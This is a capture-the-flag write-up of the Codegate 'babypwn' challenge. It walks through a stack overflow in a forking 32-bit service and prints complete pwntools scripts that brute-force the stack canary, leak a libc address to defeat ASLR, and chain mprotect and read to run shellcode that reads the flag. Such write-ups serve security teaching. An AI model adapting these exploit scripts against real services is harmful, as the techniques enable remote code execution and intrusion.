## Solved by superkojiman

I remember when baby challenges didn't require bypassing ASLR, NX, and stack canaries. babypwn is a 32-bit binary with a vanilla stack buffer overflow, and all three exploit mitigations in play. 

The binary itself is pretty simple. It runs as a service on port 8181 and forks when it receives a connection. Here's the binary in action:

![](/images/2017/codegate/babypwn/01.png)

It also comes with a call to `alarm()`, and kills our connection after 5 seconds. 

![](/images/2017/codegate/babypwn/02.png)

The meat of the program starts at 0x8048a71, which I've called `menu_select()`.

![](/images/2017/codegate/babypwn/04.png)

It's possible to crash the child process when sending a very long string with either options 1 or 2, and then selecting option 3 to exit. This triggers the stack smashing protection. The vulnerability occurs at function 0x8048907, which appears to be a wrapper to `recv()`

![](/images/2017/codegate/babypwn/03.png)

`recv_wrapper()` (as I've called it), is called when option 1 or option 2 is selected. The buffer it copies to is 52 bytes away from `menu_select()`'s saved frame pointer, and 40 bytes away from `menu_select()`'s stack canary. The saved frame pointer and stack canary can be overwritten because `recv()` reads 120 bytes from the user:

![](/images/2017/codegate/babypwn/05.png)

Ok, so we have the vulnerability, we can overwrite the saved return pointer, now we just need to bypass the exploit mitigations. 

### Bypassing alarm()

This was more of an annoyance than anything else. I ended up just patching my local binary to NOP out the call to `alarm()` at 0x8048c14. Binary Ninja made patching easy. 

### Bypassing the stack canary

The binary forks, so the child process inherits the parent's memory addresses; including the stack canary's. As long as I didn't restart the parent process, the stack canary would continue to be the same for each child spawned. This made it possible to brute force the stack canary byte-by-byte. I knew it 40 bytes into my user provided buffer, so I just had to figure out what the binary would do if I guessed the wrong byte. Using Python, it turned out that I would get a `EOFError` exception. Otherwise it meant that I guessed correctly. Here's the script to brute force the canary:

```
#!/usr/bin/env python

from pwn import *

canary = ""
canary_offset = 40
guess = 0x0

buf = ""
buf += "A" * canary_offset
buf += canary

while len(canary) < 4:
    while guess != 0xff:
        try:
            r = remote("localhost", 8181)
            #r = remote("110.10.212.130", 8888)

            r.recvuntil("Select menu > ")
            r.sendline("2")

            r.recvuntil("Input Your Message : ")
            r.send(buf + chr(guess))

            r.recvuntil("Select menu > ")
            r.sendline("3")
            d = r.recv(1024)

            # if we don't get an exception, we guessed the correct byte
            print "Guessed correct byte:", format(guess, '02x')
            canary += chr(guess)
            buf += chr(guess)
            guess = 0x0
            break

        except EOFError,e:
            # guessed the wrong byte
            guess += 1

print "Canary:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
print "Hexdump:", hexdump(canary)
```

Running this returns the stack canary:

![](/images/2017/codegate/babypwn/08.png)

ROP chain time!

### Bypassing ASLR

I assumed ASLR was enabled on the server. Why not right? With NX enabled, I couldn't execute on the stack. I needed to store my shellcode in a memory location that I could `mprotect()` to read/write/execute. To do that, I needed to find the address of `mprotect()` first. I did that by overwriting the saved return pointer with the address of `send@plt` and having it print out the address pointed to by `send@got`:

```
buf_1 = "A"*40
buf_1 += canary
buf_1 += "B"*12

# -- STAGE 1 ret2libc to leak address of send() and calculate libc base address

# ret2libc
buf_2 = ""
buf_2 += p32(0x8048700)   # send@plt
buf_2 += "CCCC"
buf_2 += p32(0x4)         # sockfd
buf_2 += p32(0x0804b064)  # send@got
buf_2 += p32(0x4)         # len
buf_2 += p32(0x0)         # flags
buf_2 += "D"*200

payload = buf_1 + buf_2
```

This returned the address of `send()`. The offset could be grabbed from my machine's `libc.so`:

![](/images/2017/codegate/babypwn/05.png)

Subtracting the offset from the address of `send()` returned libc's base address. From here on, I calculated the addresses for `mprotect()` and `read()` by adding their offsets from my libc.so to libc's base address. 

### Bypassing NX

The next step was to make a memory location read/write/execute and store my shellcode in there. To do that, I returned to `mprotect()` to make 0x0804b000 read/write/execute. From there, I returned to `read()` which would allow me to send in my shellcode. 

```
# -- STAGE 2 mprotect() a location to rwx and call read() to get shellcode in there --

buf_2 = ""
buf_2 += p32(addr_mprotect)
buf_2 += p32(0x08048eed)    # pop esi; pop edi; pop ebp; ret; 
buf_2 += p32(0x0804b000)    # address to mprotect()
buf_2 += p32(0x100)         # size to mprotect
buf_2 += p32(0x7)           # rwx

buf_2 += p32(addr_read)
buf_2 += p32(0x08048eed)    # pop esi; pop edi; pop ebp; ret; 
buf_2 += p32(0x4)           # sockfd
buf_2 += p32(0x0804b004)    # read shellcode in here
buf_2 += p32(0x100)         # len bytes to read

buf_2 += p32(0x0804b004)    # return to shellcode
buf_2 += "D"*200

payload = buf_1 + buf_2
```

### Getting the flag

So locally my exploit worked to give me a shell. However that was because I had a libc.so I could use to get the offsets for the functions I wanted. The challenge didn't provide a copy of the server's libc.so, which meant I needed to figure out which libc it was using. To do that, I used [http://libcdb.com/](http://libcdb.com/) and passed it the addresses of the `send()` function I leaked in stage 1. From there it identified the target's libc as libc-2.19_16.so, and I was able to get the offsets for the target's `mprotect()`, and `send()` functions. 

Here's the final exploit:

```
#!/usr/bin/env python

from pwn import *
import sys

context(os="linux", arch="i386")

# canary returned by brute.py
canary = "\x00\x19\x78\xcc"

buf_1 = "A"*40
buf_1 += canary
buf_1 += "B"*12

# -- STAGE 1 ret2libc to leak address of send() and calculate libc base address

# ret2libc
buf_2 = ""
buf_2 += p32(0x8048700)   # send@plt
buf_2 += "CCCC"
buf_2 += p32(0x4)         # sockfd
buf_2 += p32(0x0804b064)  # send@got
buf_2 += p32(0x4)         # len
buf_2 += p32(0x0)         # flags
buf_2 += "D"*200

payload = buf_1 + buf_2

r = remote("110.10.212.130", 8889)

r.recvuntil("Select menu > ")
r.sendline("2")

r.recvuntil("Input Your Message : ")
r.send(payload)

r.recvuntil("Select menu > ")

r.sendline("3")
d = r.recv()

# receive leaked address of send()
leak_send = r.recv()

print "Leaked function:"
print hexdump(leak_send)

# use http://libcdb.com/ to get libc version on server. 
# in this case it's libc-2.19_16.so. we can then get
# offsets for send(), mprotect(), and read()
offset_send = 0x000ed450
offset_mprotect = 0x000e70d0
offset_read = 0x000dabd0

# calculate libc base and addresses of mprotect() and read()
libc_base = u32(leak_send) - offset_send
print "libc base:", hex(libc_base)

addr_mprotect = libc_base + offset_mprotect
print "mprotect :", hex(addr_mprotect)

addr_read = libc_base + offset_read
print "read :", hex(addr_read)

r.close()


# -- STAGE 2 mprotect() a location to rwx and call read() to get shellcode in there --

buf_2 = ""
buf_2 += p32(addr_mprotect)
buf_2 += p32(0x08048eed)    # pop esi; pop edi; pop ebp; ret; 
buf_2 += p32(0x0804b000)    # address to mprotect()
buf_2 += p32(0x100)         # size to mprotect
buf_2 += p32(0x7)           # rwx

buf_2 += p32(addr_read)
buf_2 += p32(0x08048eed)    # pop esi; pop edi; pop ebp; ret; 
buf_2 += p32(0x4)           # sockfd
buf_2 += p32(0x0804b004)    # read shellcode in here
buf_2 += p32(0x100)         # number of bytes to read

buf_2 += p32(0x0804b004)    # return to shellcode
buf_2 += "D"*200

payload = buf_1 + buf_2

r = remote("110.10.212.130", 8889)

r.recvuntil("Select menu > ")

r.sendline("2")
r.recvuntil("Input Your Message : ")

r.send(payload)
r.recvuntil("Select menu > ")

r.sendline("3")
d = r.recv()

# read the contents of file flag 
sc = asm(shellcraft.linux.cat("flag", 4))
r.send(sc)
print "Getting flag:", r.recvall()
```

Win!!!

![](/images/2017/codegate/babypwn/07.png)
